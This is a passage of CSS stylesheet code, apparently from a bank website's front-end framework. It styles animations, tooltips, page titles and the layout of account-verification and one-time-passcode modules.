                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @keyframes fadeOutDown {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @-webkit-keyframes fadeOutDownModal {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @keyframes fadeOutDownModal {
            from {
                opacity: 1
            }

            to {
                opacity: 0
            }
        }

        @media only screen and (min-width: 768px) {
            @-webkit-keyframes fadeOutUp {
                from {
                    opacity: 1
                }

                to {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -25%, 0);
                    transform: translate3d(0, -25%, 0)
                }
            }

            @keyframes fadeOutUp {
                from {
                    opacity: 1
                }

                to {
                    opacity: 0;
                    -webkit-transform: translate3d(0, -25%, 0);
                    transform: translate3d(0, -25%, 0)
                }
            }

            @-webkit-keyframes fadeOutDown {
                from {
                    opacity: 1
                }

                to {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 25%, 0);
                    transform: translate3d(0, 25%, 0)
                }
            }

            @keyframes fadeOutDown {
                from {
                    opacity: 1
                }

                to {
                    opacity: 0;
                    -webkit-transform: translate3d(0, 25%, 0);
                    transform: translate3d(0, 25%, 0)
                }
            }
        }

        [data-sparta-widget] .spa-ui-info {
            min-width: 300px
        }

        [data-sparta-container] .spa-ui-layer-tooltip-link {
            color: inherit;
            text-decoration: none;
            padding-bottom: 2px;
            border-bottom: 1px dotted
        }

        [data-sparta-container] .spa-ui-layer-tooltip-link:hover,
        [data-sparta-container] .spa-ui-layer-tooltip-link:focus {
            text-decoration: none
        }

        [data-sparta-container] .spa-ui-info {
            position: fixed;
            height: auto;
            width: 100%;
            max-width: calc(90vw - 75px);
            z-index: 1000;
            padding: 20px 10px;
            border: 1px solid #ece6dd;
            background-color: #fff;
            line-height: 1;
            text-align: left;
            padding: 0;
            -webkit-animation-duration: 0.7s;
            animation-duration: 0.7s;
            -webkit-animation-fill-mode: both;
            animation-fill-mode: both;
            -webkit-animation-iteration-count: 1;
            animation-iteration-count: 1
        }

        @media only screen and (min-width: 320px) {
            [data-sparta-container] .spa-ui-info {
                max-width: 400px
            }
        }

        [data-sparta-container] .spa-ui-info .spa-content h2,
        [data-sparta-container] .spa-ui-info .spa-content h3 {
            font-size: 22px !important;
            line-height: 1.2 !important;
            font-weight: normal !important;
            color: #524940 !important;
            padding: 0 !important;
            margin: 0 0 5px 0 !important
        }

        [data-sparta-container] .spa-ui-info .spa-content .spa-close-x {
            font-size: 40px !important;
            font-weight: 400 !important;
            line-height: 18px !important
        }

        [data-sparta-container] .spa-ui-info .spa-content .content p {
            font-size: 14px !important;
            line-height: 1.3 !important;
            color: #524940 !important
        }

        [data-sparta-container] .spa-ui-info .spa-content .content a {
            font-size: 14px !important;
            line-height: 1.3 !important;
            color: #0052C2 !important
        }

        [data-sparta-container] .spa-ui-info .spa-content .content a:hover {
            color: #012169 !important
        }

        [data-sparta-container] .spa-ui-info .spa-ui-layer-close,
        [data-sparta-container] .spa-ui-info .spa-ui-layer-close:hover,
        [data-sparta-container] .spa-ui-info .spa-ui-layer-close:focus {
            text-decoration: none !important;
            border: none !important
        }

        [data-sparta-container] .spa-ui-info .spa-ui-layer-close .spa-close-x {
            color: #333
        }

        [data-sparta-container] .spa-ui-info .spa-ui-layer-close .spa-close-x:hover {
            color: #000
        }

        [data-sparta-container] .spa-ui-info.full-width {
            left: 0 !important;
            width: 100% !important
        }

        [data-sparta-container] .spa-ui-info.spa-ui-animate-fadeInDown {
            -webkit-animation-name: fadeInDown;
            animation-name: fadeInDown
        }

        [data-sparta-container] .spa-ui-info.spa-ui-animate-fadeOutUp {
            -webkit-animation-name: fadeOutUp;
            animation-name: fadeOutUp
        }

        [data-sparta-container] .spa-ui-info.spa-ui-animate-fadeInUp {
            -webkit-animation-name: fadeInUp;
            animation-name: fadeInUp
        }

        [data-sparta-container] .spa-ui-info.spa-ui-animate-fadeOutDown {
            -webkit-animation-name: fadeOutDown;
            animation-name: fadeOutDown
        }

        [data-sparta-container] .spa-ui-info .spa-layer-content {
            height: auto;
            background: #fff;
            color: #333;
            font: 14px/18px Arial, "Helvetica Neue", Helvetica, Roboto, sans-serif;
            overflow-y: auto;
            overflow-x: hidden
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-ui-info .spa-layer-content {
                background: none;
                max-height: none
            }
        }

        [data-sparta-container] .spa-ui-info .spa-header {
            position: relative;
            top: auto;
            left: auto;
            width: auto;
            height: 20px;
            display: block !important
        }

        [data-sparta-container] .spa-ui-info .spa-body {
            padding: 34px 5px 20px 20px;
            margin-right: 15px;
            -webkit-overflow-scrolling: auto
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-ui-info .spa-body {
                padding-top: 14px
            }
        }

        [data-sparta-container] .spa-ui-info .spa-body h3 {
            padding: 0;
            margin: 0 0 5px 0;
            line-height: 1.2;
            font-size: 22px;
            font-weight: normal
        }

        [data-sparta-container] .spa-ui-info .spa-body p {
            font-size: 14px;
            line-height: 1.3
        }

        [data-sparta-container] .spa-ui-info .spa-body .content {
            max-height: 100%;
            position: relative
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-ui-info .spa-body .content {
                max-height: 400px
            }
        }

        [data-sparta-container] .spa-ui-info .spa-body .content>p {
            margin-bottom: 10px
        }

        [data-sparta-container] .spa-ui-info .spa-body .content>p:last-child {
            margin-bottom: 0
        }

        .spa-ui-task {
            position: absolute;
            background: #fff;
            min-height: 125px;
            width: 417px;
            line-height: 1;
            z-index: 1000;
            border-top: 1px solid #bcb2a4;
            border-right: 2px solid #bcb2a4;
            border-bottom: 2px solid #bcb2a4;
            border-left: 1px solid #bcb2a4;
            margin-right: 10px
        }

        .spa-ui-task.full-width {
            left: 0 !important;
            width: 100% !important
        }

        .spa-ui-task .spa-content {
            background: none repeat scroll 0 0 #fff;
            color: #333;
            font: 14px/18px Arial, "Helvetica Neue", Helvetica, Roboto, sans-serif
        }

        .spa-ui-task .spa-header {
            padding: 10px 20px;
            position: relative
        }

        .spa-ui-task .spa-body {
            padding: 10px 5px 15px 25px
        }

        .spa-ui-task .spa-body p {
            margin-right: 15px
        }

        .spa-ui-task .spa-body h3 {
            border-bottom: 3px solid #e0d9d3
        }

        .spa-ui-task.arrow:before,
        .spa-ui-task.arrow:after {
            border: solid transparent;
            content: " ";
            height: 0;
            width: 0;
            position: absolute;
            pointer-events: none
        }

        .spa-ui-task.arrow:before {
            border-color: rgba(194, 225, 245, 0)
        }

        .spa-ui-task.arrow:after {
            border-color: rgba(136, 183, 213, 0)
        }

        .spa-ui-task.arrow--bottom:before,
        .spa-ui-task.arrow--bottom:after {
            top: 100%;
            left: 50%
        }

        .spa-ui-task.arrow--bottom:before {
            border-top-color: #bcb2a4;
            border-width: 29px;
            margin-left: -29px
        }

        .spa-ui-task.arrow--bottom:after {
            border-top-color: #fff;
            border-width: 25px;
            margin-left: -25px
        }

        .spa-ui-task.arrow--top:before,
        .spa-ui-task.arrow--top:after {
            bottom: 100%;
            left: 50%
        }

        .spa-ui-task.arrow--top:before {
            border-bottom-color: #bcb2a4;
            border-width: 27px;
            margin-left: -27px
        }

        .spa-ui-task.arrow--top:after {
            border-bottom-color: #fff;
            border-width: 25px;
            margin-left: -25px
        }

        .spa-ui-task.arrow--left:before,
        .spa-ui-task.arrow--left:after {
            top: 50%;
            right: 100%
        }

        .spa-ui-task.arrow--left:before {
            border-right-color: #bcb2a4;
            border-width: 26px;
            margin-top: -26px
        }

        .spa-ui-task.arrow--left:after {
            border-right-color: #fff;
            border-width: 25px;
            margin-top: -25px
        }

        .spa-ui-task.arrow--right:before,
        .spa-ui-task.arrow--right:after {
            top: 50%;
            left: 100%
        }

        .spa-ui-task.arrow--right:before {
            border-left-color: #bcb2a4;
            border-width: 29px;
            margin-top: -29px
        }

        .spa-ui-task.arrow--right:after {
            border-left-color: #fff;
            border-width: 27px;
            margin-top: -27px;
            margin-left: -1px
        }

        html.mda [data-sparta-container] .title-module-class-v-9-0-0 {
            display: none
        }

        .has-flagsape-base-class,
        [data-sparta-container] .spa-page-title--red-gradient::before,
        [data-sparta-container] .spa-page-title--red-gradient::after,
        [data-sparta-container] .spa-page-title--has-flagscape {
            background-position: center 25%;
            background-size: 200%;
            background-repeat: no-repeat
        }

        @media only screen and (min-width: 768px) {

            .has-flagsape-base-class,
            [data-sparta-container] .spa-page-title--red-gradient::before,
            [data-sparta-container] .spa-page-title--red-gradient::after,
            [data-sparta-container] .spa-page-title--has-flagscape {
                background-size: 116%
            }
        }

        [data-sparta-container] .spa-page-title {
            margin: 0 auto;
            padding: 10px 0;
            position: relative
        }

        [data-sparta-container] .spa-page-title-inset {
            height: auto !important;
            margin: 0 auto
        }

        [data-sparta-container] .spa-page-title--red {
            color: #fff;
            background-color: #DC1431
        }

        [data-sparta-container] .spa-page-title--crimson {
            color: #fff;
            background-color: #AE132A
        }

        [data-sparta-container] .spa-page-title--gray {
            background-color: #F9F7F4;
            color: #333
        }

        [data-sparta-container] .spa-page-title--red-gradient {
            color: #fff;
            background-color: #C41230
        }

        [data-sparta-container] .spa-page-title--red-gradient::before,
        [data-sparta-container] .spa-page-title--red-gradient::after {
            content: ' ';
            position: absolute;
            top: 0;
            left: 0;
            display: block;
            width: 100%;
            height: 100%
        }

        [data-sparta-container] .spa-page-title--red-gradient::before {
            display: none
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .spa-page-title--red-gradient::before {
                display: block
            }

            [data-sparta-container] .spa-page-title--red-gradient::after {
                display: none
            }
        }

        [data-sparta-container] .spa-page-title--transparent {
            color: #333
        }

        [data-sparta-container] .spa-page-title--red-text .heading {
            color: #C41230
        }

        [data-sparta-container] .spa-page-title--white-text .heading {
            color: #fff
        }

        [data-sparta-container] .spa-page-title--black-text .heading {
            color: #333
        }

        [data-sparta-container] .spa-page-title .columns,
        [data-sparta-container] .spa-page-title .row {
            height: auto
        }

        [data-sparta-container] .spa-page-title .heading {
            margin: 0;
            font-size: 22px
        }

        @media (max-width: 767px) {
            [data-sparta-container] .spa-page-title .heading {
                font-size: 18px;
                line-height: 20px
            }
        }

        .title-module-fixed {
            position: fixed;
            top: 0;
            width: 100%;
            max-width: 1296px;
            z-index: 1002;
            visibility: hidden
        }

        .secondary-sticky-module-fixed {
            -webkit-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0);
            visibility: hidden;
            position: fixed;
            top: 0;
            margin: 0;
            width: 100%;
            max-width: 1296px;
            z-index: 1002
        }

        .vis-show {
            visibility: visible
        }

        .vis-hide {
            visibility: hidden !important
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 {
            font: 100% "cnx-regular";
            color: #000
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .title-text {
            font-size: 20px
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .intro-text {
            font-size: 17px
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .mtop-10 {
            margin-top: 10px !important
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .mtop-20 {
            margin-top: 20px !important
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .mtop-30 {
            margin-top: 30px
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .mtop-40 {
            margin-top: 40px
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .mbottom-10 {
            margin-bottom: 10px
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .mbottom-20 {
            margin-bottom: 20px
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .mbottom-30 {
            margin-bottom: 30px
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .mbottom-40 {
            margin-bottom: 40px
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .mleft-15 {
            margin-left: 15px
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .ptop-30 {
            padding-top: 30px
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .acct-height {
            margin-top: 30px
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .acct-height {
                margin-top: 40px
            }
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .link-height {
            margin-bottom: 40px
        }

        @media only screen and (min-width: 768px) {
            [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .link-height {
                margin-bottom: 80px
            }
        }

        [data-sparta-container] .ah-acct-ssn-module-class-v-2-3-1 .no-padding {
            padding: 0 !important
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow {
            font: 100% Arial, Helvetica, sans-serif;
            color: #333
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 h1,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 h2,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 h3,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 h4,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 h5,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 section,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow h1,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow h2,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow h3,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow h4,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow h5,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow section {
            margin: 0
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .contact-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .contact-wrapper {
            position: relative;
            font-size: 0;
            word-wrap: break-word
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .contact-wrapper .spa-input-option-label,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .contact-wrapper .spa-input-option-label {
            margin-left: 35px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .contact-wrapper .spa-input-check,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .contact-wrapper .spa-input-check {
            top: 2px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .skin-standalone#ah-otp-widget,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .skin-standalone#ah-otp-widget {
            padding-right: 6px;
            overflow-x: hidden;
            padding-left: 1px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .skin-standalone .spartaMessage.error .spartaMessage-icon,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .skin-standalone .spartaMessage.error .spartaMessage-icon {
            margin-right: 0
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .skin-standalone .spartaMessage.error .spartaMessage-title,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .skin-standalone .spartaMessage.error .spartaMessage-title {
            margin-bottom: 0
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .skin-standalone .spartaMessage.error .spartaMessage-no-text,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .skin-standalone .spartaMessage.error .spartaMessage-no-text {
            margin-bottom: 0
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .skin-standalone .spartaMessage.error .spartaMessage-text,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .skin-standalone .spartaMessage.error .spartaMessage-text {
            margin-bottom: 0
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .skin-standalone .spartaMessage.error .spartaMessage-content,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .skin-standalone .spartaMessage.error .spartaMessage-content {
            padding-left: 20px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .skin-standalone .spartaMessage.error .spartaMessage-dismiss,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .skin-standalone .spartaMessage.error .spartaMessage-dismiss {
            display: none
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .voicetext-contact-wrapper .contact-label,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .voicetext-contact-wrapper .contact-label {
            line-height: 32px;
            vertical-align: top;
            margin-right: 20px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .voicetext-contact-wrapper .contact-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .voicetext-contact-wrapper .contact-label,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .voicetext-contact-wrapper .contact-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .voicetext-contact-wrapper .contact-label {
            display: inline-block
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .voicetext-contact-wrapper .contact-wrapper .spa-input-option-label,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .voicetext-contact-wrapper .contact-label .spa-input-option-label,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .voicetext-contact-wrapper .contact-wrapper .spa-input-option-label,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .voicetext-contact-wrapper .contact-label .spa-input-option-label {
            white-space: nowrap;
            width: 136px;
            padding-left: 5px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .section-title,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .section-title {
            font-size: 0
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .section-title .title-text,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .section-title .title-text {
            margin-right: 10px
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .section-title .title-text,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .section-title .title-text {
                margin-bottom: 5px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .section-title .title-help,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .section-title .title-help {
            display: block
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .section-title .title-help,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .section-title .title-help {
                display: block
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .errors-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .errors-wrapper {
            padding: 20px 25px;
            border: 1px solid #f8edf3;
            background-color: #fff4f9;
            max-width: 756px;
            margin-bottom: 20px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .errors-wrapper .error,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .errors-wrapper .error {
            display: inline-block;
            color: #D10019;
            margin-left: 15px;
            vertical-align: top;
            line-height: 140%;
            width: 85%
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .errors-wrapper .error .redTitle,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .errors-wrapper .error .redTitle {
            display: block
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .errors-wrapper .error br,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .errors-wrapper .error br {
            display: none
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .spa-btn--small,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .spa-btn--small {
            padding-left: 25px;
            padding-right: 25px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .btn-send-otp,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .btn-validate-otp,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .btn-cancel,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .btn-accept-close,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .btn-send-otp,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .btn-validate-otp,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .btn-cancel,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .btn-accept-close {
            margin-right: 30px;
            text-transform: uppercase
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .btn--extra-pad,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .btn--extra-pad {
            padding: 10px 45px
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .btn-send-otp,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .btn-validate-otp,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .btn-accept-close,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .btn-send-otp,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .btn-validate-otp,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .btn-accept-close {
                margin-bottom: 20px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .link-have-auth,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .link-have-auth.link,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .link-have-auth,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .link-have-auth.link {
            line-height: 45px;
            vertical-align: middle;
            color: #0052c2;
            display: inline-block
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .link-have-auth,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .action-buttons .link-have-auth.link,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .link-have-auth,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .action-buttons .link-have-auth.link {
                display: block;
                text-align: center;
                line-height: normal;
                margin-top: 20px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 #uciRequestAuthStep .action-buttons,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow #uciRequestAuthStep .action-buttons {
            margin-top: 20px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .disclaimer .disclaimer-main,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .disclaimer .disclaimer-main {
            margin-bottom: 10px
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .otp-info-message,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .otp-info-message {
            background: #ECF1F5;
            padding: 20px 23px;
            border: 1px solid #008cba
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .otp-info-message,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .otp-info-message {
                padding-left: 10px;
                padding-top: 12px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .otp-info-message .otp-message-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .otp-info-message .otp-message-wrapper {
            display: inline-block;
            vertical-align: top;
            padding-left: 19px
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .otp-info-message .otp-message-wrapper,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .otp-info-message .otp-message-wrapper {
                padding-left: 12px;
                width: 88%
            }
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .otp-info-message .info-icon,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .otp-info-message .error-icon,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .otp-info-message .info-icon,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .otp-info-message .error-icon {
                width: 24px
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-body,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-ui-layer,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-body,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-ui-layer {
            overflow: hidden
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-body .content,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-ui-layer .content,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-body .content,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-ui-layer .content {
            overflow-y: auto
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-body .content,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-ui-layer .content,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-body .content,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-ui-layer .content {
                max-height: 550px;
                overflow-y: auto
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-body .content .otp-message-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-ui-layer .content .otp-message-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-body .content .otp-message-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-ui-layer .content .otp-message-wrapper {
            display: inline-block;
            vertical-align: top;
            padding-left: 19px;
            width: 85%
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-body .content .otp-message-wrapper,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-ui-layer .content .otp-message-wrapper,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-body .content .otp-message-wrapper,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-ui-layer .content .otp-message-wrapper {
                padding-left: 12px;
                width: 88%
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-body .content *:focus,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .spa-ui-layer .content *:focus,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-body .content *:focus,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .spa-ui-layer .content *:focus {
            outline: 1px dotted #857363
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .input-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .input-wrapper {
            margin-bottom: 30px
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .input-wrapper,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .input-wrapper {
                margin-bottom: 0
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section #otp-entry-input-container,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section #otp-entry-input-container {
            display: block;
            float: none
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .request-code,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .request-code.link,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .request-code,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .request-code.link {
            margin-left: 0;
            color: #0052c2;
            display: inline-block
        }

        @media only screen and (max-width: 40em) {

            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .request-code,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .request-code.link,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .request-code,
            [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .request-code.link {
                margin-top: 20px;
                margin-bottom: 30px;
                margin-left: 0;
                display: inline-block;
                width: 100%;
                line-height: normal
            }
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .visa-cvv-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .amex-cvv-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .visa-cvv-wrapper,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .amex-cvv-wrapper {
            width: 50%
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .visa-cvv-wrapper .cc-img,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .amex-cvv-wrapper .cc-img,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .visa-cvv-wrapper .cc-img,
        [data-sparta-container] .ah-authcode-module-class-v-8-2-0-modalwindow .enter-auth-section .amex-cvv-wrapper .cc-img {
            width: 90%
        }

        [data-sparta-container] .ah-authcode-module-class-v-8-2-0 .enter-auth-section .no-float,
